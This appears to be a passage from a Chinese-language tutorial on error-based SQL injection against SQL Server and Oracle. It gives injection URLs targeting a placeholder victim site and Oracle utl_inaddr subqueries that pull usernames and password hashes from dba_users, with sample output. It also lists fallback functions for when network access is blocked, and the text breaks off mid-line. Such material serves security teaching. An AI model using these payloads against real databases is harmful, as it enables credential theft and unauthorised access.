&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;Microsoft OLE DB Provider &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; ODBC Drivers error &lt;span class=&#34;token string&#34;&gt;&#39;80040e07&#39;&lt;/span&gt; 
&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;Microsoft&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;ODBC SQL Server Driver&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;SQL Server&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;Conversion failed when converting the nvarchar value &lt;span class=&#34;token string&#34;&gt;&#39;appdbuser&#39;&lt;/span&gt; to data &lt;span class=&#34;token builtin class-name&#34;&gt;type&lt;/span&gt; int.
/products.asp, line &lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;appdbuser&lt;/code&gt;很明显这个返回能做文章，使用前面提到的&lt;code&gt;is_srvrolemember&lt;/code&gt;的返回值强制类型转换&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/products.asp?id=char(65%2Bis_srvrolemember(&#39;sysadmin&#39;))&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;Microsoft OLE DB Provider &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; ODBC Drivers error &lt;span class=&#34;token string&#34;&gt;&#39;80040e07&#39;&lt;/span&gt; 
&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;Microsoft&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;ODBC SQL Server Driver&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;SQL Server&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;Conversion failed when converting the nvarchar value &lt;span class=&#34;token string&#34;&gt;&#39;B&#39;&lt;/span&gt; to data &lt;span class=&#34;token builtin class-name&#34;&gt;type&lt;/span&gt; int. 
/products.asp, line &lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果当前用户不属于sysadmin组，那么is srvrolemember将返回0，char(65+0)将返回字母A,如果当前用户拥有管理员权限，那么is_srvrolemember将返回1, char(65+1)将返回字母B。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;having 1=1&lt;/code&gt;基于报错，枚举当前查询用得列名，通常和&lt;code&gt;group by&lt;/code&gt;一起使用，group by将已查询到的列去除，再次枚举现在第一列，sql server能产生第一列错误信息&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/products.asp?id=1+having+1=1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;Microsoft OLE DB Provider &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; ODBC Drivers error &lt;span class=&#34;token string&#34;&gt;&#39;80040e14&#39;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;Microsoft&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;ODBC SQL Server Driver&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;SQL Server&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;Column &lt;span class=&#34;token string&#34;&gt;&#39;products.id&#39;&lt;/span&gt; is invalid &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; list because it is not contained &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; either an aggregate &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; or the GROUP BY clause.
/products.asp, line &lt;span class=&#34;token number&#34;&gt;233&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;products.id&lt;/code&gt;就是第一条列名，要查询第二条&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/products.asp?id=1+group+by+products.id+having+1=1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Microsoft OLE DB Provider &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; ODBC Drivers error &lt;span class=&#34;token string&#34;&gt;&#39;80040e14&#39;&lt;/span&gt; 
&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;Microsoft&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;ODBC &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server Driver&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Column&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;products.name&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; invalid &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; list because it &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; contained &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; either an aggregate &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;GROUP&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; clause&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;shop&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;asp&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;233&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第一列属于GROUP BY子句，因而该错误现在由第二列products.name触发。接下来将该列添加到GROUP BY子句，不需要清除前面的内容&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/shop.asp?id=1+group+by+products.id,products.name+having+1=1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Oracle中的错误信息&#34;&gt;&lt;a href=&#34;#Oracle中的错误信息&#34; class=&#34;headerlink&#34; title=&#34;Oracle中的错误信息&#34;&gt;&lt;/a&gt;Oracle中的错误信息&lt;/h4&gt;&lt;p&gt;&lt;code&gt;utl_inaddr&lt;/code&gt;，该函数负责解析主机名&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; utl_inaddr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get_host_name&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;victim&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dual&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;29257&lt;/span&gt; : host victim unknown
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;06512&lt;/span&gt;: at &lt;span class=&#34;token string&#34;&gt;&#34;SYS.UTL_INADDR&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;06512&lt;/span&gt;: at &lt;span class=&#34;token string&#34;&gt;&#34;SYS.UTL_INADDR&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;35&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;06512&lt;/span&gt;: at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;关注victim，和前面小节一样，向utl_inaddr传入的都会显示在错误中&lt;/p&gt;
&lt;p&gt;用select语句替换victim，有个限制：只能返回一列和一行，否者会收到另一种报错信息ORA-01427错误消息：single-row subquery returns more than one row。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; utl_inaddr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get_host_name&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;=&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dba_users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; rownum&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;l&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dual&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;29257&lt;/span&gt;: host SYS&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;D4DF7931AB130E37 unknown
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;06512&lt;/span&gt;: at &lt;span class=&#34;token string&#34;&gt;&#34;SYS.UTL—INADDR&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;06512&lt;/span&gt;: at &lt;span class=&#34;token string&#34;&gt;&#34;SYS.UTL—INADDR&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;35&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;06512&lt;/span&gt;: at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; utl_inaddr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get_host_name&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; banner &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; v$version &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; rownum&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;l&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dual&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;29257&lt;/span&gt;: host ORACLE &lt;span class=&#34;token keyword&#34;&gt;DATABASE&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;G &lt;span class=&#34;token keyword&#34;&gt;RELEASE&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10.2&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;64&lt;/span&gt;BIT PRODUCTION unknown
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;06512&lt;/span&gt;: at &lt;span class=&#34;token string&#34;&gt;&#34;SYS.UTL—INADDR&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;06512&lt;/span&gt;: at &lt;span class=&#34;token string&#34;&gt;&#34;SYS.UTL—INADDR&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;35&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;06512&lt;/span&gt;: at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;rownum=1是控制返回第几条，不然不能得到预期结果，||管道符拼接则是绕过只能返回一列的限制&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;=&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; rownum r&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dba_users&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; r&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;29257&lt;/span&gt;: host SYS&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;D4DF7931AB130E37 unknown
&lt;span class=&#34;token comment&#34;&gt;-- 为避免所连接的字符串中出现单引号，可选用concat函数：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;61&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; rownum r&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dba_users&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; r&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;
ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;29257&lt;/span&gt;: host SYSTEM&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;E45049312A231FD1 unknown&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;绕过单行限制以获取多行信息。可通过使用带XML的专用SQL语句或专用的Oracle函数stragg(11g+)来在单行中获取所有行,上述两种方法唯一的限制是输出大小(最大为 4000字节)：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; xmltransform&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys_xmlagg&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys_xmlgen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;xmltype&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?xml version=&#34;l.0&#34;?&amp;gt;&amp;lt;xsl:stylesheet version=&#34;l.0&#34;
xmlns:xsl=&#34;http://www.w3.org/1999/XSL/Transform&#34;&amp;gt;&amp;lt;xsl:template match:&#34;/&#34;&amp;gt;&amp;lt;xsl:for-each select=&#34;/ROWSET/USERNAME&#34;&amp;gt;&amp;lt;xsl:value-of select=&#34;text()&#34;/&amp;gt;;&amp;lt;/xsl:for-each&amp;lt;/xsl:template &amp;lt;/xsl:stylesheet&amp;gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getstringval&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; listagg &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_users&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;stragg&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;distinct&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_users&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段代码注入utl_inaddr中，就会输出所有用户名：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;ALEX&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;ANONYMOUS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;APEX_PUBLIC_USER&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;CTXSYS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;DBSNMP&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;DEMO1&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;DIP&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;DUMMY&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
EXFSYS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;FLOWS_030000&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;FLOWS_FILES&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;MDDATA&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;MDSYS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;MGMT_VIEW&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
MONODEMO&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;OLAPSYS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;ORACLE_OCM&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;ORDPLUGINS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;ORDSYS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;OUTLN&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
OWBSYS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;PHP&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;PLSQL&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;SCOTT&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;SI_INFORMTN_SCHEMA&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;SPATIAL_CSW_ADMIN_USR&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
SPATIAL_WFS_ADMIN_USR&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;SYS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;SYSMAN&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;SYSTEM&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;TSMSYS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;WKPROXY&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;WKSYS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
WK_TEST&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;WMSYS&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;X&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;XDB&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;XS&lt;span class=&#34;token variable&#34;&gt;$NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;默认情况下，oracle llg通过ACL来限制对utl_inaddr和其他网络包访问，这时会得到报错network access denied by access control list，这种情况或者utl_inaddr取消了public权限，就要另外用其他函数了，下面列举函数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#注入下列内容:&lt;/span&gt;
Or &lt;span class=&#34;token assign-left variable&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ORDSYS.ORD_DICOM.GETMAPPINGXPATH&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;user,&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;,&lt;span class=&#34;token string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;-- 
&lt;span class=&#34;token comment&#34;&gt;#返回下列内容：&lt;/span&gt;
ORA-53044: invalid tag: VICTIMUSER
&lt;span class=&#34;token comment&#34;&gt;#注入下列内容：&lt;/span&gt;
or &lt;span class=&#34;token assign-left variable&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;SYS.DBMS_AW_XML.READAWMETADATA&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;user,&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;-- 
&lt;span class=&#34;token comment&#34;&gt;#返回下列内容：&lt;/span&gt;
ORA-29532: Java call terminated by uncaught Java exception: oracle.
